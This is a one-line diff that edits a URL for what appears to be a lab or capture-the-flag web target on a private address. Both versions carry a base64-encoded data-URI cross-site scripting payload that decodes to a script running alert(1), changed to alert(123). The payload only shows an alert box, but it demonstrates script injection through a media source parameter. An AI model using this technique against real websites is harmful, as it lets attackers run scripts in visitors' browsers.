@@ -1,1 +1,1 @@
-http://192.168.10.129/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+http://192.168.10.129/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+
